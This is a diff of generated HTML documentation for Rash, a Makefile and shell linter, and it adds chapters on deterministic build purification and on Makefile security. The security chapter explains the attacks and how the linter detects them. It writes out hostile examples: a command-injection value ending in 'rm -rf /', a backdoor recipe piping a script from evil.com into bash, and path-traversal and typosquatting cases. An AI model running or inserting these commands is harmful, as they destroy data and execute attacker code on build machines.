@@ -25,41 +25,28 @@
         <link rel="stylesheet" href="fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
 
-        <!-- Provide site root and default themes to javascript -->
+        <!-- Provide site root to javascript -->
         <script>
-            const path_to_root = "";
-            const default_light_theme = "rust";
-            const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex.js";
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "rust";
         </script>
         <!-- Start loading toc.js asap -->
         <script src="toc.js"></script>
     </head>
     <body>
-    <div id="mdbook-help-container">
-        <div id="mdbook-help-popup">
-            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
-            <div>
-                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
-                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
-                <p>Press <kbd>?</kbd> to show this help</p>
-                <p>Press <kbd>Esc</kbd> to hide this help</p>
-            </div>
-        </div>
-    </div>
     <div id="body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
-                let theme = localStorage.getItem('mdbook-theme');
-                let sidebar = localStorage.getItem('mdbook-sidebar');
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
 
                 if (theme.startsWith('"') && theme.endsWith('"')) {
                     localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
@@ -73,8 +60,7 @@
 
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script>
-            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
-            let theme;
+            var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
             const html = document.documentElement;
@@ -87,20 +73,17 @@
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
-                sidebar_toggle.checked = false;
             }
-            if (sidebar === 'visible') {
-                sidebar_toggle.checked = true;
-            } else {
-                html.classList.remove('sidebar-visible');
-            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
@@ -127,14 +110,13 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
                     </div>
@@ -154,12 +136,7 @@
 
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
-                            <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
-                            </div>
-                        </div>
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -1013,9 +990,7 @@ alias ls='ls -G'           # Only the last one is active
 <p>This matches how shells process config files line-by-line.</p>
 <h2 id="implementation-1"><a class="header" href="#implementation-1">Implementation</a></h2>
 <p>The consolidation algorithm:</p>
-<pre><pre class="playground"><code class="language-rust no_run"><span class="boring">#![allow(unused)]
-</span><span class="boring">fn main() {
-</span>use std::collections::HashMap;
+<pre><code class="language-rust ignore">use std::collections::HashMap;
 use regex::Regex;
 
 /// Consolidate duplicate aliases, keeping only the last definition
@@ -1068,13 +1043,10 @@ struct AliasDefinition {
 fn analyze_aliases(source: &amp;str) -&gt; Vec&lt;AliasDefinition&gt; {
     // Implementation details...
     vec![]
-}
-<span class="boring">}</span></code></pre></pre>
+}</code></pre>
 <h2 id="testing-2"><a class="header" href="#testing-2">Testing</a></h2>
 <p>CONFIG-003 has comprehensive tests:</p>
-<pre><pre class="playground"><code class="language-rust no_run"><span class="boring">#![allow(unused)]
-</span><span class="boring">fn main() {
-</span>#[test]
+<pre><code class="language-rust ignore">#[test]
 fn test_config_003_consolidate_simple() {
     // ARRANGE
     let source = r#"alias ls='ls --color=auto'
@@ -1122,8 +1094,7 @@ alias ls='ls -G'"#;
         consolidated_once, consolidated_twice,
         "Consolidation should be idempotent"
     );
-}
-<span class="boring">}</span></code></pre></pre>
+}</code></pre>
 <h2 id="real-world-example-2"><a class="header" href="#real-world-example-2">Real-World Example</a></h2>
 <p>Common scenario in a 5-year-old .bashrc:</p>
 <pre><code class="language-bash"><span class="boring"> Original setup (2019)
@@ -1261,8 +1232,513 @@ fi
 <li><a href="config/rules/./config-001.html">CONFIG-001: PATH Deduplication</a></li>
 <li><a href="config/rules/./config-002.html">CONFIG-002: Quote Variables</a></li>
 </ul>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="makefile-overview"><a class="header" href="#makefile-overview">Makefile Overview</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="makefile-purification-with-rash"><a class="header" href="#makefile-purification-with-rash">Makefile Purification with Rash</a></h1>
+<p>Rash provides <strong>Makefile purification</strong> - automatically detecting and fixing non-deterministic patterns in GNU Makefiles to ensure reproducible, deterministic builds.</p>
+<h2 id="why-purify-makefiles"><a class="header" href="#why-purify-makefiles">Why Purify Makefiles?</a></h2>
+<h3 id="the-problem"><a class="header" href="#the-problem">The Problem</a></h3>
+<p>Makefiles often contain non-deterministic constructs that lead to unreproducible builds:</p>
+<pre><code class="language-makefile"># ❌ Non-deterministic - file order depends on filesystem
+SOURCES := $(wildcard src/*.c)
+HEADERS := $(wildcard include/*.h)
+
+# ❌ Non-deterministic - find output order varies
+ALL_FILES := $(shell find . -name '*.c')
+
+# ❌ Parallel build races - multiple targets write same file
+build/config.h: generate-config
+	./gen-config &gt; build/config.h
+
+build/defaults.h: generate-defaults
+	./gen-defaults &gt; build/config.h  # ❌ Race condition!
+</code></pre>
+<p><strong>Result</strong>: Different build outputs on different machines, flaky parallel builds, hard-to-reproduce bugs.</p>
+<h3 id="the-solution"><a class="header" href="#the-solution">The Solution</a></h3>
+<p>Rash automatically transforms Makefiles to be <strong>deterministic</strong> and <strong>safe for parallel builds</strong>:</p>
+<pre><code class="language-makefile"># ✅ Deterministic - sorted file order
+SOURCES := $(sort $(wildcard src/*.c))
+HEADERS := $(sort $(wildcard include/*.h))
+
+# ✅ Deterministic - sorted find output
+ALL_FILES := $(sort $(shell find . -name '*.c'))
+
+# ✅ Parallel-safe - targets write different files
+build/config.h: generate-config
+	./gen-config &gt; build/config.h
+
+build/defaults.h: generate-defaults
+	./gen-defaults &gt; build/defaults.h  # ✅ No race
+</code></pre>
+<p><strong>Result</strong>: Reproducible builds, reliable parallel execution, consistent behavior across machines.</p>
+<h2 id="features"><a class="header" href="#features">Features</a></h2>
+<p>Rash Makefile purification provides:</p>
+<h3 id="1-wildcard-sorting-make001"><a class="header" href="#1-wildcard-sorting-make001">1. <strong>Wildcard Sorting</strong> (MAKE001)</a></h3>
+<pre><code class="language-bash">$ rash lint Makefile
+MAKE001: Non-deterministic wildcard expansion
+  --&gt; Makefile:10
+   |
+10 | SOURCES := $(wildcard src/*.c)
+   |            ^^^^^^^^^^^^^^^^^^^ filesystem order is non-deterministic
+   |
+   = help: Wrap with $(sort ...) for determinism
+   = fix: SOURCES := $(sort $(wildcard src/*.c))
+</code></pre>
+<h3 id="2-shell-command-sorting-make002"><a class="header" href="#2-shell-command-sorting-make002">2. <strong>Shell Command Sorting</strong> (MAKE002)</a></h3>
+<pre><code class="language-bash">$ rash lint Makefile
+MAKE002: Non-deterministic shell command
+  --&gt; Makefile:15
+   |
+15 | FILES := $(shell find . -name '*.c')
+   |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^ find output order varies
+   |
+   = help: Wrap with $(sort ...) for determinism
+   = fix: FILES := $(sort $(shell find . -name '*.c'))
+</code></pre>
+<h3 id="3-parallel-build-safety-make010-make017"><a class="header" href="#3-parallel-build-safety-make010-make017">3. <strong>Parallel Build Safety</strong> (MAKE010-MAKE017)</a></h3>
+<ul>
+<li><strong>MAKE010</strong>: Detect shared file write races</li>
+<li><strong>MAKE011</strong>: Recommend .NOTPARALLEL for unsafe patterns</li>
+<li><strong>MAKE012</strong>: Detect missing dependencies</li>
+<li><strong>MAKE013</strong>: Suggest order-only prerequisites</li>
+<li><strong>MAKE014</strong>: Detect directory creation races</li>
+<li><strong>MAKE015</strong>: Handle recursive make calls</li>
+<li><strong>MAKE016</strong>: Detect output file conflicts</li>
+<li><strong>MAKE017</strong>: Timestamp reproducibility</li>
+</ul>
+<h3 id="4-auto-fix"><a class="header" href="#4-auto-fix">4. <strong>Auto-Fix</strong></a></h3>
+<pre><code class="language-bash"><span class="boring"> Automatically fix all issues
+</span>$ rash lint --fix Makefile
+
+Fixed 3 issues:
+  ✅ MAKE001: Wrapped wildcard with sort (line 10)
+  ✅ MAKE001: Wrapped wildcard with sort (line 11)
+  ✅ MAKE002: Wrapped shell find with sort (line 15)
+
+Makefile is now deterministic and reproducible!
+</code></pre>
+<h2 id="quick-start-1"><a class="header" href="#quick-start-1">Quick Start</a></h2>
+<h3 id="analyze-a-makefile"><a class="header" href="#analyze-a-makefile">Analyze a Makefile</a></h3>
+<pre><code class="language-bash"><span class="boring"> Check for issues
+</span>$ rash lint Makefile
+
+<span class="boring"> Auto-fix all issues
+</span>$ rash lint --fix Makefile
+
+<span class="boring"> Output purified Makefile
+</span>$ rash purify Makefile &gt; Makefile.purified
+</code></pre>
+<h3 id="example-before-and-after-1"><a class="header" href="#example-before-and-after-1">Example: Before and After</a></h3>
+<p><strong>Before</strong> (<code>Makefile</code>):</p>
+<pre><code class="language-makefile"># Compiler settings
+CC := gcc
+CFLAGS := -O2 -Wall
+
+# ❌ Non-deterministic wildcards
+SOURCES := $(wildcard src/*.c)
+HEADERS := $(wildcard include/*.h)
+OBJECTS := $(SOURCES:.c=.o)
+
+# Build rule
+all: build/myapp
+
+build/myapp: $(OBJECTS)
+	$(CC) $(CFLAGS) -o $@ $(OBJECTS)
+</code></pre>
+<p><strong>After</strong> (<code>rash lint --fix Makefile</code>):</p>
+<pre><code class="language-makefile"># Compiler settings
+CC := gcc
+CFLAGS := -O2 -Wall
+
+# ✅ Deterministic - sorted wildcards
+SOURCES := $(sort $(wildcard src/*.c))
+HEADERS := $(sort $(wildcard include/*.h))
+OBJECTS := $(SOURCES:.c=.o)
+
+# Build rule
+all: build/myapp
+
+build/myapp: $(OBJECTS)
+	$(CC) $(CFLAGS) -o $@ $(OBJECTS)
+</code></pre>
+<p><strong>Verification</strong>:</p>
+<pre><code class="language-bash"><span class="boring"> Build twice - should be identical
+</span>$ make clean &amp;&amp; make
+$ md5sum build/myapp &gt; checksum1.txt
+
+$ make clean &amp;&amp; make
+$ md5sum build/myapp &gt; checksum2.txt
+
+$ diff checksum1.txt checksum2.txt
+<span class="boring"> ✅ No differences - build is reproducible!
+</span></code></pre>
+<h2 id="use-cases"><a class="header" href="#use-cases">Use Cases</a></h2>
+<h3 id="1-reproducible-builds"><a class="header" href="#1-reproducible-builds">1. Reproducible Builds</a></h3>
+<p>Ensure the same source code always produces the same binary:</p>
+<pre><code class="language-bash"><span class="boring"> Purify Makefile
+</span>$ rash lint --fix Makefile
+
+<span class="boring"> Build on machine A
+</span>$ make clean &amp;&amp; make
+$ md5sum build/app
+abc123...
+
+<span class="boring"> Build on machine B (same source)
+</span>$ make clean &amp;&amp; make
+$ md5sum build/app
+abc123...  # ✅ Identical
+</code></pre>
+<h3 id="2-parallel-build-safety"><a class="header" href="#2-parallel-build-safety">2. Parallel Build Safety</a></h3>
+<p>Detect and fix race conditions in parallel builds:</p>
+<pre><code class="language-bash">$ rash lint Makefile
+MAKE010: Parallel build race detected
+  --&gt; Makefile:25
+   |
+25 | build/config.h: generate-config
+26 |     ./gen-config &gt; build/config.h
+   |
+30 | build/defaults.h: generate-defaults
+31 |     ./gen-defaults &gt; build/config.h
+   |                      ^^^^^^^^^^^^^^^^ multiple targets write same file
+   |
+   = warning: Running make -j may produce corrupted output
+   = fix: Ensure each target writes unique output files
+</code></pre>
+<h3 id="3-cicd-reliability"><a class="header" href="#3-cicd-reliability">3. CI/CD Reliability</a></h3>
+<p>Eliminate flaky builds in continuous integration:</p>
+<pre><code class="language-yaml"># .github/workflows/build.yml
+- name: Lint Makefile
+  run: rash lint Makefile
+
+- name: Build (parallel)
+  run: make -j$(nproc)
+  # ✅ No races, deterministic output
+</code></pre>
+<h3 id="4-cross-platform-consistency"><a class="header" href="#4-cross-platform-consistency">4. Cross-Platform Consistency</a></h3>
+<p>Same build results on Linux, macOS, BSD:</p>
+<pre><code class="language-bash"><span class="boring"> purify Makefile to use sorted wildcards
+</span>$ rash lint --fix Makefile
+
+<span class="boring"> Build on any platform - identical results
+</span></code></pre>
+<h2 id="how-it-works"><a class="header" href="#how-it-works">How It Works</a></h2>
+<p>Rash Makefile purification follows these steps:</p>
+<ol>
+<li><strong>Parse</strong> Makefile to AST</li>
+<li><strong>Analyze</strong> for non-deterministic patterns</li>
+<li><strong>Transform</strong> AST to fix issues</li>
+<li><strong>Generate</strong> purified Makefile</li>
+</ol>
+<pre><code>┌─────────────┐
+│   Makefile  │
+│  (original) │
+└──────┬──────┘
+       │
+       ▼
+┌─────────────┐
+│  Parse AST  │  ← Lexer + Parser
+└──────┬──────┘
+       │
+       ▼
+┌─────────────┐
+│   Analyze   │  ← Semantic analysis (297 tests)
+│   Issues    │    - Wildcards, shell commands
+│             │    - Parallel safety, timestamps
+└──────┬──────┘
+       │
+       ▼
+┌─────────────┐
+│  Transform  │  ← Purification engine
+│     AST     │    - Wrap with $(sort ...)
+│             │    - Fix race conditions
+└──────┬──────┘
+       │
+       ▼
+┌─────────────┐
+│  Generate   │  ← Code generation
+│  Purified   │
+│  Makefile   │
+└─────────────┘
+</code></pre>
+<h2 id="quality-assurance"><a class="header" href="#quality-assurance">Quality Assurance</a></h2>
+<p>Rash Makefile support has <strong>NASA-level testing</strong>:</p>
+<ul>
+<li><strong>297 unit tests</strong> covering all transformations</li>
+<li><strong>Property-based testing</strong> with 100+ random Makefiles</li>
+<li><strong>EXTREME TDD</strong> methodology (RED-GREEN-REFACTOR)</li>
+<li><strong>Zero tolerance</strong> for regressions</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>#[test]
+fn test_MAKE001_wildcard_basic() {
+    let makefile = "SOURCES := $(wildcard *.c)";
+    let result = purify_makefile(makefile).unwrap();
+
+    assert_eq!(
+        result,
+        "SOURCES := $(sort $(wildcard *.c))"
+    );
+}
+<span class="boring">}</span></code></pre></pre>
+<p><strong>Test Coverage</strong>: 100% of purification logic tested</p>
+<h2 id="next-steps-1"><a class="header" href="#next-steps-1">Next Steps</a></h2>
+<ul>
+<li><a href="makefile/./security.html">Makefile Security</a> - Detect injection vulnerabilities</li>
+<li><a href="makefile/./best-practices.html">Makefile Best Practices</a> - Recommended patterns</li>
+<li><a href="makefile/../examples/makefile-purification.html">Example: Purifying a Real Makefile</a></li>
+</ul>
+<h2 id="resources"><a class="header" href="#resources">Resources</a></h2>
+<ul>
+<li>GNU Make Manual: https://www.gnu.org/software/make/manual/</li>
+<li>Reproducible Builds: https://reproducible-builds.org/</li>
+<li>SOURCE_DATE_EPOCH: https://reproducible-builds.org/specs/source-date-epoch/</li>
+</ul>
+<hr />
+<p><strong>Pro Tip</strong>: Use <code>rash lint --fix</code> as a pre-commit hook to ensure all Makefiles remain deterministic:</p>
+<pre><code class="language-bash"><span class="boring"> .git/hooks/pre-commit
+</span><span class="boring">!/bin/bash
+</span>rash lint --fix Makefile
+git add Makefile
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="makefile-security"><a class="header" href="#makefile-security">Makefile Security</a></h1>
+<p>Rash detects security vulnerabilities in Makefiles, including command injection, unsafe shell usage, and privilege escalation risks.</p>
+<h2 id="security-rules"><a class="header" href="#security-rules">Security Rules</a></h2>
+<h3 id="make003-command-injection-via-unquoted-variables"><a class="header" href="#make003-command-injection-via-unquoted-variables">MAKE003: Command Injection via Unquoted Variables</a></h3>
+<p><strong>Risk</strong>: HIGH - Arbitrary command execution</p>
+<p><strong>Problem</strong>: Unquoted variables in shell commands allow injection attacks.</p>
+<pre><code class="language-makefile"># ❌ DANGEROUS: Command injection vulnerability
+install:
+	cp $(FILE) /usr/local/bin/  # Attacker: FILE="../../../etc/passwd; rm -rf /"
+</code></pre>
+<p><strong>Attack Vector</strong>:</p>
+<pre><code class="language-bash">$ make FILE="../../../etc/passwd; rm -rf /" install
+<span class="boring"> Executes: cp ../../../etc/passwd; rm -rf / /usr/local/bin/
+</span></code></pre>
+<p><strong>Solution</strong>: Always quote variables in shell commands.</p>
+<pre><code class="language-makefile"># ✅ SAFE: Quoted variable prevents injection
+install:
+	cp "$(FILE)" /usr/local/bin/
+</code></pre>
+<p><strong>Detection</strong>:</p>
+<pre><code class="language-bash">$ rash lint Makefile
+MAKE003: Potential command injection
+  --&gt; Makefile:2
+   |
+ 2 |     cp $(FILE) /usr/local/bin/
+   |        ^^^^^^^ unquoted variable in shell command
+   |
+   = help: Quote variable to prevent injection
+   = fix: cp "$(FILE)" /usr/local/bin/
+</code></pre>
+<h3 id="make004-unsafe-shell-metacharacters"><a class="header" href="#make004-unsafe-shell-metacharacters">MAKE004: Unsafe Shell Metacharacters</a></h3>
+<p><strong>Risk</strong>: MEDIUM - Unintended shell expansion</p>
+<p><strong>Problem</strong>: Shell metacharacters (<code>*</code>, <code>?</code>, <code>[</code>, <code>]</code>) expand unexpectedly.</p>
+<pre><code class="language-makefile"># ❌ RISKY: Glob expansion may surprise
+clean:
+	rm -f *.o  # What if there's a file named "-rf"?
+</code></pre>
+<p><strong>Attack Vector</strong>:</p>
+<pre><code class="language-bash">$ touch -- "-rf"
+$ make clean
+<span class="boring"> Executes: rm -f -rf *.o
+</span><span class="boring"> May delete more than intended!
+</span></code></pre>
+<p><strong>Solution</strong>: Use explicit file lists or find with -delete.</p>
+<pre><code class="language-makefile"># ✅ SAFER: Explicit file list
+OBJS := $(sort $(wildcard *.o))
+
+clean:
+	rm -f $(OBJS)
+</code></pre>
+<h3 id="make009-privilege-escalation-via-sudo"><a class="header" href="#make009-privilege-escalation-via-sudo">MAKE009: Privilege Escalation via sudo</a></h3>
+<p><strong>Risk</strong>: CRITICAL - Root access abuse</p>
+<p><strong>Problem</strong>: Makefiles running sudo without validation.</p>
+<pre><code class="language-makefile"># ❌ DANGEROUS: Unrestricted sudo
+install:
+	sudo cp app /usr/local/bin/
+	sudo chmod 4755 /usr/local/bin/app  # Sets SUID bit!
+</code></pre>
+<p><strong>Solution</strong>: Use install(1) or warn users about sudo.</p>
+<pre><code class="language-makefile"># ✅ BETTER: Use install command
+install:
+	@if [ "$(shell id -u)" != "0" ]; then \
+		echo "Error: Must run as root or with sudo"; \
+		exit 1; \
+	fi
+	install -m 755 app /usr/local/bin/app
+</code></pre>
+<p><strong>Detection</strong>:</p>
+<pre><code class="language-bash">$ rash lint Makefile
+MAKE009: Unsafe sudo usage
+  --&gt; Makefile:3
+   |
+ 3 |     sudo chmod 4755 /usr/local/bin/app
+   |     ^^^^ unrestricted sudo with dangerous permissions
+   |
+   = warning: SUID bit grants root privileges
+   = help: Use install(1) or check permissions explicitly
+</code></pre>
+<h2 id="real-world-attack-scenarios"><a class="header" href="#real-world-attack-scenarios">Real-World Attack Scenarios</a></h2>
+<h3 id="scenario-1-repository-poisoning"><a class="header" href="#scenario-1-repository-poisoning">Scenario 1: Repository Poisoning</a></h3>
+<p><strong>Attack</strong>: Malicious Makefile in cloned repository</p>
+<pre><code class="language-makefile"># Attacker's Makefile
+.PHONY: all
+all:
+	@echo "Building project..."
+	@curl -s https://evil.com/steal.sh | bash  # ❌ Backdoor
+	gcc -o app main.c
+</code></pre>
+<p><strong>Defense</strong>:</p>
+<pre><code class="language-bash"><span class="boring"> Always review Makefiles before running make
+</span>$ rash lint Makefile
+MAKE007: Suspicious network access in recipe
+  --&gt; Makefile:4
+   |
+ 4 |     @curl -s https://evil.com/steal.sh | bash
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ downloads and executes remote code
+   |
+   = error: Potential backdoor or data exfiltration
+   = help: Review all network operations in build scripts
+</code></pre>
+<h3 id="scenario-2-dependency-confusion"><a class="header" href="#scenario-2-dependency-confusion">Scenario 2: Dependency Confusion</a></h3>
+<p><strong>Attack</strong>: Typosquatting in shell commands</p>
+<pre><code class="language-makefile"># ❌ Typo allows attacker to substitute malicious binary
+build:
+	nmp install  # Should be "npm", but PATH includes attacker's "nmp"
+</code></pre>
+<p><strong>Defense</strong>:</p>
+<pre><code class="language-makefile"># ✅ Use absolute paths for critical tools
+NPM := /usr/bin/npm
+
+build:
+	$(NPM) install
+</code></pre>
+<h3 id="scenario-3-path-traversal"><a class="header" href="#scenario-3-path-traversal">Scenario 3: Path Traversal</a></h3>
+<p><strong>Attack</strong>: Writing files outside build directory</p>
+<pre><code class="language-makefile"># ❌ DANGEROUS: Allows path traversal
+OUTPUT_DIR := $(PREFIX)/output
+
+install:
+	cp build/* $(OUTPUT_DIR)/
+	# Attacker: make PREFIX=../../../etc install
+</code></pre>
+<p><strong>Defense</strong>:</p>
+<pre><code class="language-makefile"># ✅ SAFE: Validate PREFIX and use absolute paths
+PREFIX ?= /usr/local
+OUTPUT_DIR := $(realpath $(PREFIX))/output
+
+install:
+	@if [ -z "$(realpath $(PREFIX))" ]; then \
+		echo "Error: Invalid PREFIX"; \
+		exit 1; \
+	fi
+	cp build/* "$(OUTPUT_DIR)/"
+</code></pre>
+<h2 id="security-best-practices"><a class="header" href="#security-best-practices">Security Best Practices</a></h2>
+<h3 id="1-principle-of-least-privilege"><a class="header" href="#1-principle-of-least-privilege">1. Principle of Least Privilege</a></h3>
+<pre><code class="language-makefile"># ❌ BAD: Runs everything as root
+.PHONY: all install
+all:
+	sudo make build  # Unnecessary root access
+
+install:
+	sudo cp app /usr/local/bin/
+</code></pre>
+<p><strong>Better</strong>:</p>
+<pre><code class="language-makefile"># ✅ GOOD: Only elevate when necessary
+.PHONY: all install
+all:
+	make build  # Build as regular user
+
+install:
+	@if [ "$(shell id -u)" != "0" ]; then \
+		echo "Run: sudo make install"; \
+		exit 1; \
+	fi
+	install -m 755 app /usr/local/bin/
+</code></pre>
+<h3 id="2-input-validation"><a class="header" href="#2-input-validation">2. Input Validation</a></h3>
+<pre><code class="language-makefile"># ✅ Validate all user-provided variables
+PREFIX ?= /usr/local
+
+install:
+	@if [ -z "$(PREFIX)" ] || echo "$(PREFIX)" | grep -q '\.\.' ; then \
+		echo "Error: Invalid PREFIX"; \
+		exit 1; \
+	fi
+	install -m 755 app "$(PREFIX)/bin/"
+</code></pre>
+<h3 id="3-avoid-eval-and-shell-expansion"><a class="header" href="#3-avoid-eval-and-shell-expansion">3. Avoid Eval and Shell Expansion</a></h3>
+<pre><code class="language-makefile"># ❌ DANGEROUS: eval() equivalent
+COMMAND := $(shell cat commands.txt)
+run:
+	$(COMMAND)  # Executes arbitrary commands from file
+</code></pre>
+<p><strong>Safer</strong>:</p>
+<pre><code class="language-makefile"># ✅ Explicit command list
+VALID_COMMANDS := build test clean
+
+run:
+	@if ! echo "$(VALID_COMMANDS)" | grep -qw "$(CMD)"; then \
+		echo "Error: Unknown command $(CMD)"; \
+		exit 1; \
+	fi
+	@$(CMD)
+</code></pre>
+<h3 id="4-secure-file-permissions"><a class="header" href="#4-secure-file-permissions">4. Secure File Permissions</a></h3>
+<pre><code class="language-makefile"># ✅ Use appropriate permissions
+install:
+	install -m 755 app /usr/local/bin/app          # Executable, not writable
+	install -m 644 app.conf /etc/app/app.conf      # Config, not executable
+	install -m 600 app.key /etc/app/app.key        # Secret, owner-only
+</code></pre>
+<h2 id="security-checklist"><a class="header" href="#security-checklist">Security Checklist</a></h2>
+<p>Before deploying a Makefile:</p>
+<ul>
+<li><input disabled="" type="checkbox"/>
+✅ Run <code>rash lint Makefile</code> to detect vulnerabilities</li>
+<li><input disabled="" type="checkbox"/>
+✅ Quote all variables used in shell commands</li>
+<li><input disabled="" type="checkbox"/>
+✅ Validate user-provided inputs (PREFIX, DESTDIR, etc.)</li>
+<li><input disabled="" type="checkbox"/>
+✅ Use absolute paths for critical binaries</li>
+<li><input disabled="" type="checkbox"/>
+✅ Avoid running unnecessary commands as root</li>
+<li><input disabled="" type="checkbox"/>
+✅ Set minimal file permissions with install(1)</li>
+<li><input disabled="" type="checkbox"/>
+✅ Review all network operations (curl, wget, git clone)</li>
+<li><input disabled="" type="checkbox"/>
+✅ Check for path traversal vulnerabilities</li>
+<li><input disabled="" type="checkbox"/>
+✅ Avoid eval-like constructs</li>
+<li><input disabled="" type="checkbox"/>
+✅ Test with malicious inputs (fuzzing)</li>
+</ul>
+<h2 id="automated-security-scanning"><a class="header" href="#automated-security-scanning">Automated Security Scanning</a></h2>
+<pre><code class="language-bash"><span class="boring"> Run security linter
+</span>$ rash lint --security-only Makefile
+
+<span class="boring"> CI/CD integration
+</span><span class="boring"> .github/workflows/security.yml
+</span>- name: Security Scan
+  run: |
+    cargo install bashrs
+    rash lint --security-only Makefile
+    if [ $? -ne 0 ]; then
+      echo "Security vulnerabilities detected!"
+      exit 1
+    fi
+</code></pre>
+<h2 id="resources-1"><a class="header" href="#resources-1">Resources</a></h2>
+<ul>
+<li><a href="https://owasp.org/www-community/vulnerabilities/Build_Misconfiguration">OWASP Build Security</a></li>
+<li><a href="https://www.gnu.org/software/make/manual/html_node/Security.html">GNU Make Security</a></li>
+<li><a href="https://reproducible-builds.org/">Reproducible Builds</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: OS Command Injection</a></li>
+</ul>
+<hr />
+<p><strong>Remember</strong>: Makefiles execute arbitrary shell commands - treat them like executable code, not configuration files!</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="makefile-best-practices"><a class="header" href="#makefile-best-practices">Makefile Best Practices</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="bootstrap-installer"><a class="header" href="#bootstrap-installer">Bootstrap Installer</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="deployment-script"><a class="header" href="#deployment-script">Deployment Script</a></h1>
@@ -1306,8 +1782,8 @@ fi
         </script>
 
         <script src="ace.js"></script>
-        <script src="mode-rust.js"></script>
         <script src="editor.js"></script>
+        <script src="mode-rust.js"></script>
         <script src="theme-dawn.js"></script>
         <script src="theme-tomorrow_night.js"></script>
 
@@ -1326,7 +1802,6 @@ fi
             window.setTimeout(window.print, 100);
         });
         </script>
-
 
     </div>
     </body>
